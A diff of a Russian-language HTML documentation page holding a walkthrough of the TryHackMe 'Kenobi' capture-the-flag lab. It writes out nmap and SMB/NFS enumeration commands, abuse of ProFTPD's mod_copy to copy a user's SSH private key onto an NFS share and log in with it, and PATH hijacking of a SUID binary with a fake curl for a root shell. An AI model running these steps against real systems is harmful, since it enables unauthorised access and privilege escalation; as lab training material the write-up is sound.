@@ -464,9 +464,61 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Kenoby
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         Kenoby
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание раздела">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Сканирование
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    Работа с SMB
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nfs" class="md-nav__link">
+    Дополнительное сканирование NFS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proftpd" class="md-nav__link">
+    Поиск и эксплуатация уязвимости ProFTPD
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -507,7 +559,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Upload_Vulnearbilities.md" class="md-nav__link">
+      <a href="../Upload_Vulnerabilities/" class="md-nav__link">
         Upload Vulnerabilities
       </a>
     </li>
@@ -1986,6 +2038,42 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Сканирование
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    Работа с SMB
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nfs" class="md-nav__link">
+    Дополнительное сканирование NFS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proftpd" class="md-nav__link">
+    Поиск и эксплуатация уязвимости ProFTPD
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2001,70 +2089,72 @@
 
 <h1 id="kenoby">Kenoby</h1>
 <hr />
-<p><a href="https://tryhackme.com/room/kenobi">https://tryhackme.com/room/kenobi</a>
-Основная задача - разведка через SMB, внедрение через эксплуатацию уязвимостей, эскалация прав через бинарники с SUID правами.</p>
-<ol>
-<li>Проведение разведки с nmap на предмет наличия открытых портов:</li>
-</ol>
-<p><code>sudo nmap -T 4 $IP-ADDRESS #</code>Обнаружены открытые порты 80, 111, 22, 21, 445, 139, 42729</p>
-<ol>
-<li>Сканируем со стандартными скриптами для определения версий сервисов, ПО и прочей информации:</li>
-</ol>
-<p><code>sudo nmap -A 111,80,445,22,21,139,42729 $IP-ADDRESS</code>
-Получаем сведения о версии ProFTTPD сервера.</p>
-<ol>
-<li>Проводим enumeration SMB с помощью стандартных nse скриптов: </li>
-</ol>
-<p><code>nmap --script=smb-enum-shares.nse,smb-enum-users.nse -p 445 $IP-ADDRESS</code></p>
-<ol>
-<li>Подключаемся к шаре </li>
-</ol>
-<p><code>smbclient //$IP_ADDRESS/anonymous -N</code>
-получаем файл log.txt в котором находим информацию о том, что ранее был сгенерирована пара ключей, очевидно для доступа через ssh. Кроме того, получена информация о ProFTPD серверве и об NFS который работает через 111 порт с помощью RPC. </p>
-<ol>
-<li>Проводим  enumeration NFS:</li>
-</ol>
-<p><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP_ADDRESS</code>
-Получаем информацию о том, что /var смонтирована в NFS.</p>
-<ol>
-<li>Эксплойтим ProFTPD. В <a href="https://www.exploit-db.com/exploits/39161">exploit-db</a> находим уязвимость ProFTPD модуля mod_copy_module. </li>
-</ol>
-<p>Этот модуль позволяет копировать файлы из одной директории в другую на ProFTPD сервере без авторизации на самом сервере. Осуществляется это с помощью команд SITE CPFR (источник) и SITE CPTO (назначение).</p>
-<ol>
-<li>Так как директория /var расшарена через NFS, установим значение SITE SPFR в ~/.ssh/id_rsa , а SITE CPTO в /var/id_rsa</li>
-<li>
-<p>Далее монтируем /var с удаленной машины к себе:</p>
-<p>mkdir /mnt/kenobiNFS
-mount machine_ip:/var /mnt/kenobiNFS
-ls -la /mnt/kenobiNFS</p>
-</li>
-<li>
-<p>Выставляем права chmod 600 /mnt/id_rsa и подключаемся к системе: </p>
-</li>
-</ol>
-<p>ssh -i /mnt/id_rsa kenoby@$IP_ADDRESS</p>
-<ol>
-<li>Ищем бинарники с SUID/GUID правами:</li>
-</ol>
-<p><code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code>
-Находим несвойственный бинарник /usr/bin/menu</p>
-<ol>
-<li>
-<p>Программой strings просматриваем текстовое содержимое /usr/bin/menu находим то, что она вызывает:</p>
-<p>curl -I localhost
-uname -r
-ifconfig
-Видно, что вышеуказанные бинарники определены в составе /usr/bin/menu без кавычек, следовательно мы можем их подменить. </p>
-</li>
-<li>
-<p>Делать будем через добавление в PATH нужно директории где положим payload вместо curl.</p>
-<p>cd /tmp
-echo /bin/sh &gt; curl
-chmod 777 curl 
-export PATH=/tmp:$PATH</p>
-</li>
-</ol>
-<p>Запускаем /usr/bin/menu выбираем пункт с curl -&gt; получаем root shell </p>
+<p>Основная задача - разведка через SMB, внедрение через эксплуатацию уязвимостей, эскалация прав через бинарники с SUID правами.<br />
+Описание задания можно найти на <a href="https://tryhackme.com/room/kenobi">TryHackme</a></p>
+<h3 id="_1">Сканирование</h3>
+<p>Проведение разведки с nmap на предмет наличия открытых портов:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-T<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="nv">$IP</span>-ADDRESS
+</span></code></pre></div>
+<blockquote>
+<p>Обнаружены открытые порты 80, 111, 22, 21, 445, 139, 42729</p>
+</blockquote>
+<p>Сканируем со стандартными скриптами для определения версий сервисов, ПО и прочей информации:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span><span class="m">111</span>,80,445,22,21,139,42729<span class="w"> </span><span class="nv">$IP</span>-ADDRESS
+</span></code></pre></div>
+<blockquote>
+<p>Получаем сведения о версии <code>ProFTTPD</code> сервера.</p>
+</blockquote>
+<p>Проводим enumeration SMB с помощью стандартных nse скриптов: </p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nmap<span class="w"> </span>--script<span class="o">=</span>smb-enum-shares.nse,smb-enum-users.nse<span class="w"> </span>-p<span class="w"> </span><span class="m">445</span><span class="w"> </span><span class="nv">$IP</span>-ADDRESS
+</span></code></pre></div>
+<h3 id="smb">Работа с SMB</h3>
+<p>Подключаемся к шаре </p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>smbclient<span class="w"> </span>//<span class="nv">$IP_ADDRESS</span>/anonymous<span class="w"> </span>-N
+</span></code></pre></div>
+<blockquote>
+<p>получаем файл <code>log.txt</code> в котором находим информацию о том, что ранее был сгенерирована пара ключей, очевидно для доступа через <code>ssh</code>.<br />
+Кроме того, получена информация о <code>ProFTPD</code> серверве и об <code>NFS</code> который работает через 111 порт с помощью RPC. </p>
+</blockquote>
+<h3 id="nfs">Дополнительное сканирование NFS</h3>
+<p>Проводим  enumeration NFS:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">111</span><span class="w"> </span>--script<span class="o">=</span>nfs-ls,nfs-statfs,nfs-showmount<span class="w"> </span><span class="nv">$IP_ADDRESS</span>
+</span></code></pre></div>
+<blockquote>
+<p>Получаем информацию о том, что /var смонтирована в NFS.</p>
+</blockquote>
+<h3 id="proftpd">Поиск и эксплуатация уязвимости <code>ProFTPD</code></h3>
+<p>В <a href="https://www.exploit-db.com/exploits/39161">exploit-db</a> находим уязвимость <code>ProFTPD</code> модуля <code>mod_copy_module</code>.<br />
+Этот модуль позволяет копировать файлы из одной директории в другую на <code>ProFTPD</code> сервере без авторизации на самом сервере. Осуществляется это с помощью команд <code>SITE CPFR (источник)</code> и <code>SITE CPTO (назначение)</code>.</p>
+<p>Так как директория <code>/var</code> расшарена через <code>NFS</code>, установим значение <code>SITE SPFR</code> в <code>~/.ssh/id_rsa</code> , а <code>SITE CPTO</code> в <code>/var/id_rsa</code>.</p>
+<p>Далее монтируем <code>/var</code> с удаленной машины к себе:
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>mkdir<span class="w"> </span>/mnt/kenobiNFS
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>mount<span class="w"> </span>machine_ip:/var<span class="w"> </span>/mnt/kenobiNFS
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>ls<span class="w"> </span>-la<span class="w"> </span>/mnt/kenobiNFS
+</span></code></pre></div></p>
+<p>Выставляем права <code>chmod 600 /mnt/id_rsa</code> и подключаемся к системе: 
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ssh<span class="w"> </span>-i<span class="w"> </span>/mnt/id_rsa<span class="w"> </span>kenoby@<span class="nv">$IP_ADDRESS</span>
+</span></code></pre></div>
+Ищем бинарники с SUID/GUID правами:
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-a<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-perm<span class="w"> </span>-u+s<span class="w"> </span>-o<span class="w"> </span>-perm<span class="w"> </span>-g+s<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
+</span></code></pre></div></p>
+<blockquote>
+<p>Находим несвойственный бинарник <code>/usr/bin/menu</code></p>
+</blockquote>
+<p>С помощью <code>strings</code> просматриваем текстовое содержимое <code>/usr/bin/menu</code> находим то, что она вызывает:
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span>-I<span class="w"> </span>localhost
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>uname<span class="w"> </span>-r
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>ifconfig
+</span></code></pre></div></p>
+<blockquote>
+<p>Видно, что вышеуказанные бинарники определены в составе <code>/usr/bin/menu</code> без абсолютного пути, следовательно мы можем их подменить. </p>
+</blockquote>
+<p>Делать будем через добавление в <code>PATH</code> нужной директории, куда поместим нужный payload вместо <code>curl</code>.
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">echo</span><span class="w"> </span>/bin/sh<span class="w"> </span>&gt;<span class="w"> </span>curl
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>chmod<span class="w"> </span><span class="m">777</span><span class="w"> </span>curl<span class="w"> </span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></code></pre></div>
+Запускаем <code>/usr/bin/menu</code> выбираем пункт с <code>curl</code> -&gt; получаем <code>root shell</code></p>
 
 
 
